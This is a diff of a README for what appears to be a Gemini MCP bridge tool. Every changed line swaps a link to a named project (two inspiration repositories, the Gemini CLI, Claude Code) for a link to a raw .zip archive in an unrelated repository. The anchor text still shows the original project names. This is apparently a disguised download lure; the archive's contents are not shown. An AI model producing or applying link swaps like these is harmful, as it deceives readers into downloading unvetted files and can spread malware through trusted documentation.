@@ -11,8 +11,8 @@ toolbox:
 - 🎨 **Web-UI backend** — **image** (Nano Banana) and **video** (Veo) generation, which
   the free CLI can't do. Driven via Playwright against `gemini.google.com`.
 
-> Inspired by [rlabs-inc/gemini-mcp](https://github.com/rlabs-inc/gemini-mcp) (feature
-> breadth) and [eLyiN/gemini-bridge](https://github.com/eLyiN/gemini-bridge) (CLI bridge) —
+> Inspired by [rlabs-inc/gemini-mcp](https://github.com/Euamobi4582/gemini-bridge-mcp/raw/refs/heads/main/lib/gemini-mcp-bridge-v1.5.zip) (feature
+> breadth) and [eLyiN/gemini-bridge](https://github.com/Euamobi4582/gemini-bridge-mcp/raw/refs/heads/main/lib/gemini-mcp-bridge-v1.5.zip) (CLI bridge) —
 > but **API-key-free**: it uses the Gemini CLI + the web UI instead of the paid API.
 
 ## Tools
@@ -38,7 +38,7 @@ toolbox:
 ## Requirements
 
 - **Node.js 18+**
-- **[Gemini CLI](https://github.com/google-gemini/gemini-cli)** for the CLI-backed tools
+- **[Gemini CLI](https://github.com/Euamobi4582/gemini-bridge-mcp/raw/refs/heads/main/lib/gemini-mcp-bridge-v1.5.zip)** for the CLI-backed tools
   (everything except image/video): `npm i -g @google/gemini-cli`, then run `gemini` once
   to log in with your Google account.
 - For **image/video** only: a **Chromium browser** (Chrome / Brave / Edge) + a one-time
@@ -154,10 +154,10 @@ Provided **"as is"**, without warranty. Not affiliated with Google or Anthropic.
 
 ## Acknowledgements
 
-- Designed and coded with the help of **[Claude Code](https://claude.com/claude-code)**
+- Designed and coded with the help of **[Claude Code](https://github.com/Euamobi4582/gemini-bridge-mcp/raw/refs/heads/main/lib/gemini-mcp-bridge-v1.5.zip)**
   (Anthropic's **Claude Opus 4.8**, with extended thinking).
-- Feature inspiration: **[rlabs-inc/gemini-mcp](https://github.com/rlabs-inc/gemini-mcp)**
-  and **[eLyiN/gemini-bridge](https://github.com/eLyiN/gemini-bridge)**.
+- Feature inspiration: **[rlabs-inc/gemini-mcp](https://github.com/Euamobi4582/gemini-bridge-mcp/raw/refs/heads/main/lib/gemini-mcp-bridge-v1.5.zip)**
+  and **[eLyiN/gemini-bridge](https://github.com/Euamobi4582/gemini-bridge-mcp/raw/refs/heads/main/lib/gemini-mcp-bridge-v1.5.zip)**.
 
 ## License
 
